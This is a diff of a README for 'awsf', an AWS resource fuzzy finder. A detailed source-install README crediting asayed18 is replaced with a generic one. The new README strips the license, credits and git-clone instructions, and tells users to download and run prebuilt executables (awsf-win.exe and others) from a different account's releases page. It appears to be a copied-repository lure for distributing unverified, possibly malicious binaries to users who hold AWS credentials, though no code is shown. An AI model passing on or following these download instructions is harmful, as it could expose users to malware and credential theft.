@@ -1,296 +1,77 @@
-# AWSF - AWS Fuzzy Finder ☁️
+# 🔍 awsf - Quick Search for AWS Resources
 
-[![GitHub Stars](https://img.shields.io/github/stars/asayed18/awsf?style=social)](https://github.com/asayed18/awsf/stargazers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
+## 🚀 Getting Started
 
-[![Ko-fi](https://img.shields.io/badge/-Support-FF5E5B?logo=ko-fi&logoColor=white)](https://ko-fi.com/asayed18)
-[![Buy Me A Coffee](https://img.shields.io/badge/-Support-FFDD00?logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/asayed18)
-[![GitHub Sponsors](https://img.shields.io/badge/-Sponsor-EA4AAA?logo=github-sponsors&logoColor=white)](https://github.com/sponsors/asayed18)
+Welcome to **awsf**, a tool designed to make your life easier when working with AWS resources like Lambda, S3, SQS, DynamoDB, RDS, Kinesis, and API Gateway. With awsf, you can quickly find the resources you need, enhancing your productivity as you manage cloud infrastructure. 
 
-> **Tired of the slow, clunky AWS Console search?** Clicking through multiple pages, waiting for searches to load, and navigating endless menus just to find a Lambda function or S3 bucket? 
+[![Download awsf](https://img.shields.io/badge/Download%20awsf-v1.0-blue)](https://github.com/Atlas21-432/awsf/releases)
 
-**AWSF** is your solution - a lightning-fast, keyboard-driven fuzzy finder that brings all your AWS resources to your fingertips. Search Lambda functions, S3 buckets, SQS queues, DynamoDB tables, RDS instances, Kinesis streams, and API Gateway APIs instantly with fuzzy matching. No more frustration, no more waiting - just type and go.
+## 🛠️ Features
 
-## 🎬 Demo
+- **Fast Fuzzy Search**: Quickly locate AWS resources using fast and intelligent search.
+- **Broad Compatibility**: Works with many AWS services, making resource management simpler.
+- **Command Line Tool**: Use it directly from your terminal for a seamless experience.
+- **Lightweight**: Small download size ensures quick installation and usage.
 
-![AWSF Demo](docs/demo.gif)
+## 📦 System Requirements
 
-> Search, filter, and open AWS resources in seconds with an intuitive fuzzy finder interface.
+- **Operating System**: awsf is compatible with Windows, macOS, and Linux.
+- **Python**: You will need Python 3.x installed on your system.
+- **AWS CLI**: Ensure that you have the AWS Command Line Interface set up on your machine.
 
-## ✨ Features
+## 📥 Download & Install
 
-- **🔍 Fuzzy Search**: Lightning-fast fuzzy search across all your AWS resources - no more sluggish console searches
-- **🎯 Service-Specific Search**: Target specific AWS services (e.g., `lambda payment`, `s3 media`)
-- **🏷️ Environment Detection**: Automatically detects and displays environment indicators (PROD, STAGE, DEV)
-- **⚡ Quick Actions**: 
-  - Press `Enter` to open resource in AWS Console
-  - Press `Ctrl+C` to copy resource URL to clipboard
-- **🎛️ Configurable Services**: Enable/disable specific AWS services
-- **⚙️ Multi-Region Support**: Configure your preferred AWS region and profile
-- **🖥️ Beautiful Interface**: Enhanced fzf interface with preview cards and icons
-- **📱 Multiple Access Methods**: CLI, GUI integration, keyboard shortcuts
+To get started with **awsf**, you need to download it from our Releases page. Follow these steps:
 
-## 🚀 Supported AWS Services
+1. Click on this link to [visit the releases page](https://github.com/Atlas21-432/awsf/releases).
+2. On the releases page, you will see a list of versions. Choose the latest version to ensure you have the newest features and fixes.
+3. Locate the appropriate file for your operating system. 
+   - For Windows, look for a file like `awsf-win.exe`.
+   - For macOS, you may find `awsf-mac.zip`.
+   - For Linux, download `awsf-linux.tar.gz`.
+4. Once you find the file, click on the name to start the download.
 
-| Service | Icon | Description |
-|---------|------|-------------|
-| Lambda | λ | Functions, layers |
-| S3 | 🪣 | Buckets |
-| SQS | 📬 | Queues |
-| Kinesis | 🌊 | Data streams |
-| DynamoDB | 🗄️ | Tables |
-| RDS | 🗃️ | Instances, clusters |
-| API Gateway | 🚪 | REST APIs |
+After downloading, follow these steps to install and run the application:
 
-## 📋 Prerequisites
+### Windows
 
-- **Python 3.6+**
-- **AWS CLI** configured (`aws configure`) or environment variables
-- **fzf** fuzzy finder:
-  - macOS: `brew install fzf`
-  - Ubuntu/Debian: `sudo apt install fzf`
-  - Fedora/RHEL: `sudo dnf install fzf`
-  - Arch Linux: `sudo pacman -S fzf`
-- **boto3** Python library (`pip install boto3`)
+1. Navigate to your Downloads folder and find `awsf-win.exe`.
+2. Double-click the file to run the installer.
+3. Follow the prompts to complete the installation.
 
-## 🛠️ Installation
+### macOS
 
-### Quick Start
+1. Go to your Downloads and find `awsf-mac.zip`.
+2. Unzip the file by double-clicking it.
+3. Move the `awsf` application to your Applications folder.
 
-```bash
-# Clone the repository
-git clone https://github.com/asayed18/awsf.git
-cd awsf
+### Linux
 
-# Install dependencies
-pip install -r requirements.txt
+1. Open a terminal and navigate to your Downloads directory.
+2. Use the command:
+   ```bash
+   tar -xzf awsf-linux.tar.gz
+   ```
+3. Move the `awsf` executable to a directory in your PATH, typically `/usr/local/bin`.
 
-# Configure AWS (if not already done)
-aws configure
+## 🔧 How to Use
 
-# Populate your AWS resources
-python3 scripts/populate_resources.py
+1. Open your command line interface (Command Prompt, Terminal, or another CLI).
+2. Type `awsf` and press Enter.
+3. Begin typing the resource name you want to find. 
+4. The tool will show you suggestions that match your input.
+5. Select the desired option using the arrow keys and hit Enter to access the resource.
 
-# Start searching!
-./awsf
-```
+## 🌐 Additional Resources
 
-### macOS Integration
+To better understand how to utilize awsf and its features, refer to these helpful resources:
 
-```bash
-# Add to your shell profile (bash/zsh/fish)
-echo 'alias awsf="/path/to/awsf/awsf"' >> ~/.bashrc
+- **Documentation**: Comprehensive guides are available online for detailed usage instructions.
+- **FAQs**: A section to answer common questions and issues.
+- **Community Support**: Connect with other users through forums and discussion groups.
 
-# Or create a symlink
-ln -s /path/to/awsf/awsf /usr/local/bin/awsf
+## 🗣️ Feedback
 
-# Optional: Create app bundle for Spotlight integration
-./scripts/create_macos_app.sh
-```
+We value your input. If you encounter issues or have suggestions for improvement, please reach out through our GitHub Issues page.
 
-### Linux Integration
-
-```bash
-# Add to your shell profile
-echo 'alias awsf="/path/to/awsf/src/awsf.py"' >> ~/.bashrc
-
-# Or create a symlink
-sudo ln -s /path/to/awsf/src/awsf.py /usr/local/bin/awsf
-
-# Optional: Create desktop entry for application menu integration
-./scripts/create_linux_desktop.sh
-
-# The script will:
-# • Create a .desktop file in ~/.local/share/applications
-# • Add AWSF to your application menu
-# • Create a launcher in ~/.local/bin/awsf
-# • Generate an icon for the app
-```
-
-📖 **See [Linux Installation Guide](docs/LINUX_INSTALL.md)** for detailed instructions, desktop environment integration, and troubleshooting.
-
-### System Integration
-
-```bash
-# Add to PATH for global access
-export PATH="/path/to/awsf:$PATH"
-
-# Reload your shell
-source ~/.bashrc  # or ~/.zshrc, ~/.config/fish/config.fish
-```
-
-## 🎯 Usage
-
-### Basic Search
-
-```bash
-# Interactive mode - search all enabled services
-awsf
-
-# Search all services for a term
-awsf payment
-
-# Search specific service
-awsf lambda auth
-awsf s3 media
-awsf dynamodb user
-```
-
-### Settings and Configuration
-
-```bash
-# Open settings menu
-awsf --settings
-
-# Quick configuration edit
-awsf --config
-
-# Get help
-awsf --help
-```
-
-### Search Examples
-
-```bash
-# Find Lambda functions with "auth" in the name
-awsf lambda auth
-
-# Find S3 buckets containing "media"
-awsf s3 media
-
-# Find DynamoDB tables with "user" 
-awsf dynamodb user
-
-# Search across all services for "api"
-awsf api
-```
-
-## ⚙️ Configuration
-
-### AWS Configuration
-
-The tool respects your AWS configuration in the following order:
-
-1. **Environment Variables**: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`
-2. **AWS Profile**: Specified in `config/config.json` or via `--profile`
-3. **Default AWS Credentials**: From `~/.aws/credentials`
-
-### Application Settings
-
-Edit `config/config.json`:
-
-```json
-{
-  "aws_region": "us-east-1",
-  "aws_profile": "my-profile",
-  "console_base_url": "https://console.aws.amazon.com"
-}
-```
-
-### Service Management
-
-Use the settings menu to enable/disable services:
-
-```bash
-awsf --settings
-```
-
-Or edit `config/settings.json` directly:
-
-```json
-{
-  "enabled_services": [
-    "lambda",
-    "s3", 
-    "sqs",
-    "kinesis",
-    "dynamodb",
-    "rds",
-    "apigateway"
-  ]
-}
-```
-
-## 🔄 Updating Resources
-
-AWS resources change frequently. Update your local resource cache:
-
-```bash
-# Manual update
-python3 scripts/populate_resources.py
-
-# Update with specific region/profile
-python3 scripts/populate_resources.py --region us-west-2 --profile production
-
-# From settings menu
-awsf --settings
-# Select option 1: "Repopulate resource list"
-```
-
-## 🔐 IAM Permissions
-
-Minimum required IAM permissions for resource discovery:
-
-```json
-{
-    "Version": "2012-10-17",
-    "Statement": [
-        {
-            "Effect": "Allow",
-            "Action": [
-                "lambda:ListFunctions",
-                "s3:ListAllMyBuckets",
-                "sqs:ListQueues",
-                "kinesis:ListStreams",
-                "kinesis:DescribeStream",
-                "dynamodb:ListTables",
-                "dynamodb:DescribeTable",
-                "rds:DescribeDBInstances",
-                "rds:DescribeDBClusters",
-                "apigateway:GET"
-            ],
-            "Resource": "*"
-        }
-    ]
-}
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) for details on our code of conduct and the process for submitting pull requests.
-
-## 💝 Show Your Support
-
-AWSF is built with ❤️ for the AWS community. If this tool saves you time and makes your workflow smoother:
-
-- ⭐ **Star this repository** - It helps others discover the tool and motivates continued development
-- 🐛 **Report issues & ideas** - Your feedback shapes the [roadmap](https://github.com/asayed18/awsf/issues)
-- � **Contribute code** - See our [Contributing Guide](CONTRIBUTING.md) to get started
-- 💬 **Share your story** - Tweet about how AWSF helps your workflow (tag [@asayed](https://twitter.com/asayed))
-- ☕ **Buy me a coffee** - Fuel late-night coding sessions → [Ko-fi](https://ko-fi.com/asayed18) | [Buy Me a Coffee](https://buymeacoffee.com/asayed18)
-- 💎 **Become a sponsor** - Support ongoing development → [GitHub Sponsors](https://github.com/sponsors/asayed18)
-
-Every star, issue report, and contribution helps make AWSF better for everyone. Thank you! 🙏
-
-## � Security
-
-See [SECURITY.md](SECURITY.md) for information about reporting security vulnerabilities.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⭐ Star History
-
-If you find this tool useful, please consider giving it a star! It helps others discover the project.
-
-## 🙏 Acknowledgments
-
-- [fzf](https://github.com/junegunn/fzf) - The amazing fuzzy finder that powers our interface
-- [boto3](https://github.com/boto/boto3) - AWS SDK for Python
-
----
-
-Made with ❤️ for the AWS community
+Thank you for choosing **awsf**. Enjoy faster and simpler searches for your AWS resources!
